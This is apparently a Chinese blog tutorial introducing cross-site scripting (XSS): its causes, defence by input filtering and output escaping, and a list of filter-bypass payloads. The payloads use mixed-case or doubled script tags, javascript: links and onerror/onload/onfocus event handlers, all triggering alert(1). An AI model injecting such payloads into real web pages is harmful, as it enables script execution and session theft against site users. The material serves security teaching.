---
categories:
- 信息技术
- HTML
- js
category: js
draft: false
published: 2024-05-10 23:33:56
slug: xss-跨站脚本-初识
tags:
- js
- xss
- JavaScript
- 跨站脚本
title: XSS 跨站脚本 初识
updated: 2024-09-18 11:16:48
---

## 一、XSS（跨站脚本）概述

跨站脚本(Cross-Site Scripting，简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限（如执行一些操作)、私密网页内容、会话和cookie等各种内容。

XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。

XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。

形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。

因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:

输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;

输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

## 二、XSS的一些变形

### 1、大小写和双写绕过

<sCRIpt>aLert(1)</sCRIPT>

<scscriptript>alert(1)</scscriptript>

### 2、a标签

<a href=”javascript:onclick=alert(1)”>test</a>

<a href=javascript:alert(1)>test</a>

### 3、src属性

<img src=x onerror=alert(1)>

<img/src=x onerror=alert(1)>

<video src=x onerror=alert(1)>

<audio src=x onerror=alert(1)>

<iframe src=”javascript:alert(1)”>

### 4、利用事件绕过

<svg onload=alert(1)><body onload=alert(1)>

<select autofogus onfocus=alert(1)>

<textarea autofocus onfocus=alert(1)>

<video><source onerror="javascript:alert(1)">

<iframe onload=alert(1)>